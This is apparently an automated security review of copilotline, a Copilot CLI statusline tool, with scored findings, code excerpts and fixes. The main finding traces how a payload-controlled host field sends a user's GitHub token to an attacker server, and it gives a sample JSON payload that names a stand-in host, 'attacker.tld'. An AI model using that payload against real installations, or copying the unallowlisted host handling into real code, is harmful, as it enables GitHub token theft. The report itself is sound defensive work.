# Security Review — copilotline

**Health score: 76/100**
Arithmetic: start 100; −12 (High: SSRF token-exfil via payload host); −6 (Medium: arbitrary write via `--capture`); −6 (Medium: semgrep TS coverage gap); → 100 − 12 − 6 − 6 = **76/100**.

> **Severity calibration note:** the headline SSRF is a genuine token-exfiltration path, which the rubric maps to Critical. It is scored **High, not Critical**, because exploitation requires an attacker to control the JSON written to the statusline's stdin, and in the deployed configuration that stdin is produced by GitHub Copilot CLI, not by a remote network attacker. It is remote-token-exfil *in mechanism* but local/indirect *in reachability*. If the team's threat model treats the Copilot payload as attacker-influenced (and their own `SECURITY.md` priority #5 says "Untrusted JSON"), this is Critical. **The review summary treats it as a release-blocker either way.**

**Verdict:** Shippable with one High fix strongly recommended pre-GA: the payload-controlled API host lets untrusted stdin redirect the user's GitHub token to an arbitrary `api.<host>` server, violating the project's own stated security guarantee. No RCE, no shell injection, no committed secrets, TLS never disabled, child processes all arg-array. The host allowlist is the single material gap.

## Findings

| # | Severity | CWE | Location | Issue | Recommendation |
|---|----------|-----|----------|-------|----------------|
| 1 | High | CWE-918 / CWE-522 (OWASP A10:2021) | copilot-account.ts:282-289, 108/119/419; copilot-usage.ts:96,206-220 | Payload-controlled `host` flows into `https://api.<host>/user` and `/copilot_internal/user` with the user's GitHub token in `Authorization`. `normalizeHost` strips scheme/trailing-slash but does **not** allowlist. Untrusted stdin can exfiltrate the token to an attacker host. | Allowlist host to `github.com` + `*.ghe.com` / known GHE patterns, or require the host to come from a trusted local source (Copilot config / `gh`), never from the payload, before any token-bearing fetch. |
| 2 | Medium | CWE-73 / CWE-22 (OWASP A01:2021) | cli.ts:130-131 | `render --capture <path>` writes raw stdin bytes to a user-supplied path with no validation and no explicit private mode, before parse. | Resolve/normalize path, refuse writing outside an allowed dir or to existing privileged files, write with `mode: 0o600`. Low urgency: the flag is operator-supplied, not payload-supplied. |
| 3 | Medium | CWE-1059 / process gap | .semgrep.yml:17,29,42,59,77,93,107,121,135 | `.semgrep.yml` is `languages: [python]` for every rule; it scans **none** of this TS/Bun product. The SAST gate advertised in the security posture provides zero coverage here. | Add TS/JS semgrep rules (or rely on CodeQL `security-and-quality`, which does cover TS) and add an SSRF/`fetch`-non-literal-URL rule for JS. |
| 4 | Low | CWE-89-adjacent (interpolation) | copilot-account.ts:337 | sqlite3 query string is a fixed literal (key prefixes hardcoded) — no injection. Noted only to confirm it was checked. | None. |

## Detail

### Finding 1 — SSRF / GitHub-token exfiltration via payload-controlled API host (High, 88% confidence)

**Evidence (source → sink):**

Source — untrusted stdin JSON `host` field, extracted with no validation:
```
src/infrastructure/copilot-account.ts:171-182
  const host = pickString(input, ["account","host"], ["account","hostname"],
                          ["github","host"], ... ) ?? "github.com";
  return { login, host: normalizeHost(host), source: "payload" };
```

The only transform is `normalizeHost`, which does **not** allowlist:
```
src/infrastructure/copilot-account.ts:282-289
  export function normalizeHost(host: string): string {
    return host.replace(/^https?:\/\//, "").replace(/\/$/, "") || "github.com";
  }
  export function usageApiBaseForHost(host: string): string {
    const normalized = normalizeHost(host);
    return normalized === "github.com" ? "https://api.github.com" : `https://api.${normalized}`;
  }
```
So a payload `host` of `evil.example.com` yields the base `https://api.evil.example.com`.

Selection — in the **default `auto` mode**, the payload account is selected (README confirms payload is precedence #1):
```
src/infrastructure/copilot-account.ts:60-82
  const candidates = uniqueAccounts([ accountFromPayload(input), ... ]);
  const system = candidates.find((a) => a.source !== "manual") ?? null;  // = payload
  selected: override ?? system        // auto mode: override=null → selected = payload
```

Trigger — the render path feeds untrusted `parsed` stdin straight into the background refresh, which spawns a detached child carrying the payload host:
```
src/cli.ts:134-136
  const parsed = safeParse(stdin.raw);
  refreshCopilotUsageInBackground(statusLineCommand(), parsed);

src/infrastructure/copilot-usage.ts:206-220
  const account = selectCopilotAccount(input).selected;   // = payload account
  const args = [commandPath, "refresh", "--quiet"];
  if (account) args.push("--login", account.login, "--host", account.host);  // payload host
  spawn(process.execPath, args, { detached: true, env: process.env });        // inherits tokens
```

Sink — the child resolves a token and verifies it against the payload host, sending the token to the attacker server during verification (before any login match check can reject it):
```
src/infrastructure/copilot-account.ts:102-112
  for (const [source, value] of envCandidates) {        // COPILOTLINE_GITHUB_TOKEN, GH_TOKEN, ...
    const token = cleanToken(value);
    if (!token) continue;
    const login = await loginForToken(token, account.host, options);   // host = payload host
    ...
  }

src/infrastructure/copilot-account.ts:419-427
  const response = await fetchImpl(`${usageApiBaseForHost(host)}/user`, {
    headers: { Authorization: `token ${token}`, ... },   // TOKEN SENT TO https://api.<payloadHost>/user
  });
```
The same applies to the `gh auth token` fallback (line 114-119) and to the quota fetch in `copilot-usage.ts:96-100`.

**Attack scenario:** Copilot CLI renders the statusline by piping a session JSON to `copilotline render`. If an attacker can influence any account/host field in that payload — e.g. via a crafted repository/workspace, a malicious MCP/tool response, or any content that lands in the Copilot session state that populates the statusline payload — they set `{"account":{"login":"victim","host":"attacker.tld"}}`. On the next render, copilotline spawns a refresh that sends `Authorization: token <victim token>` to `https://api.attacker.tld/user`. The attacker's server logs the bearer token. The login does **not** need to match: the token is transmitted during the `loginForToken` verification call, and only afterward is the returned login compared.

**Impact:** Disclosure of a GitHub token (PAT or `gh` OAuth token) with whatever scopes the user granted — typically `repo`, `read:org`, Copilot entitlement. Directly violates `SECURITY.md` priority #1: "GitHub tokens must never be … sent anywhere except GitHub's API." Exfiltration is silent (detached child, `stdio: "ignore"`).

**Fix:**
```ts
// copilot-account.ts
const HOST_ALLOWLIST = /^(github\.com|[a-z0-9-]+\.ghe\.com|[a-z0-9.-]+\.githubenterprise\.com)$/i;

export function normalizeHost(host: string): string {
  const normalized = host.replace(/^https?:\/\//, "").replace(/\/$/, "") || "github.com";
  return HOST_ALLOWLIST.test(normalized) ? normalized : "github.com";
}
```
Stronger: never let a `source: "payload"` host reach a token-bearing fetch — derive the host only from local trusted sources (`~/.copilot/config.json`, VS Code state, `gh`), and treat the payload host as display-only metadata.

## Hardening recommendations (non-blocking)

- **`--capture` (Finding 2):** resolve the path, reject paths outside an allowed root, and write with `mode: 0o600`. Operator-supplied, so defense-in-depth.
- **Detached refresh inherits full `env`** (copilot-usage.ts:219): the child inherits the entire parent environment including all token vars. After fixing the host allowlist, consider passing only the specific resolved token rather than the whole env.
- **`gitleaks detect --source .`** (security.yml:30) scans the whole tree including the vendored `.ai-engineering/**`; the `.gitleaks.toml` allowlist is scoped to that framework's state files. No product secrets are committed (verified).
- **install.sh supply chain:** checksum is fetched from the *same* origin as the binary, so a GitHub-release compromise defeats it — standard for release installers and acceptable; npm provenance (already enabled, release.yml:51) is the stronger trust anchor. TLS enforced (`curl -fsSL`), temp dir cleaned via trap, `set -euo pipefail` present.
- **CI token perms:** `security.yml`/`codeql.yml` use least-privilege `permissions:` blocks. `release.yml binaries` job has `contents: write` (needed for `gh release upload`) — appropriate.
- **JSONC parser (copilot-settings-file.ts):** `stripJsonComments`/`stripTrailingCommas` are single-pass linear scanners with proper in-string/escape state — no catastrophic backtracking, no ReDoS, no injection (output fed to `JSON.parse`, not `eval`).

## not_applicable / low_signal

- **Command/shell injection:** NOT APPLICABLE. All 6 spawn sites use argv arrays with `shell:false`. Payload-derived `login`/`host`/`cwd` are passed as discrete argv elements after their flags — cannot inject flags or commands. The sqlite query is a hardcoded literal.
- **TLS:** NOT APPLICABLE. No `rejectUnauthorized`, `NODE_TLS_REJECT_UNAUTHORIZED`, or `verify:false` anywhere. All fetches are `https://`.
- **Token leakage to logs / cache / `--json`:** LOW SIGNAL (clean). Verified copilot-usage.ts:487-489: cache persists only `tokenSource` (a label string), account login/host, and quota numbers — never the token. Error messages and `--json` output serialize the same metadata, no secret.
- **Deserialization:** NOT APPLICABLE. Only `JSON.parse` on untrusted input; no `eval`, `pickle`, `yaml.load`, `Function()`.
- **Hardcoded secrets:** NONE.
- **DoS:** Mitigated — stdin capped at 2 MB, all network calls have `AbortController` timeouts (5 s), spawn timeouts (1.5-3 s), refresh debounced 30 s.

## Self-challenge (theoretical vs exploitable)

- **Finding 1 — EXPLOITABLE in mechanism, reachability-gated.** Strongest false-positive argument: stdin is produced by Copilot CLI, not an attacker. Still reported because (a) `SECURITY.md` classifies stdin JSON as a trust boundary and pledges tokens never leave GitHub's API; (b) the parser reads `account.host` from many shapes, so any future Copilot field or tool/MCP-injected content is a live vector; (c) the fix is cheap. Not inflated to Critical because a remote-unauthenticated injection of the host field was not demonstrated. Confidence 88% the code path is exploitable given a malicious payload.
- **Finding 2 (`--capture`) — REAL but low-severity.** Operator-supplied path, not payload. Hardening gap, not a privilege boundary crossing.
- **Finding 3 (semgrep gap) — FACTUAL, process risk.** CodeQL *does* cover `javascript-typescript`, which partially compensates — but its default SSRF query may not flag the `api.${normalized}` template, so Finding 1 could ship undetected.
- **Child-process injection — investigated and DROPPED.** All positional after their flags, arg-array, no shell. No injection.

## Validator handoff (YAML)

```yaml
findings:
  - id: security-1
    severity: high
    file: src/infrastructure/copilot-account.ts
    line: 282
    claim: >
      Payload-controlled host passes through normalizeHost (NO allowlist) into
      usageApiBaseForHost -> https://api.<host>/user (loginForToken:419) and
      /copilot_internal/user (copilot-usage.ts:96) WITH the GitHub token in
      Authorization. Reached from render via refreshCopilotUsageInBackground
      (cli.ts:136 -> copilot-usage.ts:206-220) spawning a detached child with
      --host <payloadHost>. Token exfiltrated during verification before the
      login-match check. CWE-918/CWE-522, OWASP A10:2021.
    fix: >
      Allowlist host (github.com + GHE patterns) inside normalizeHost or before
      any token-bearing fetch; non-allowlisted hosts fall back to api.github.com.
  - id: security-2
    severity: medium
    file: src/cli.ts
    line: 130
    claim: >
      render --capture <path> writes raw stdin bytes to a user-supplied path with
      no validation and no explicit 0o600 mode, before parse. CWE-73/CWE-22.
    fix: "Resolve/normalize path, reject writes outside an allowed root, write mode 0o600."
  - id: security-3
    severity: medium
    file: .semgrep.yml
    line: 17
    claim: >
      Every semgrep rule is languages:[python]; the SAST gate scans none of this
      TS/Bun product. CodeQL covers javascript-typescript but its default SSRF
      query may not flag the api.${host} template.
    fix: "Add TS/JS semgrep rules including a non-literal-fetch-URL SSRF rule, or add a targeted CodeQL SSRF query."
```
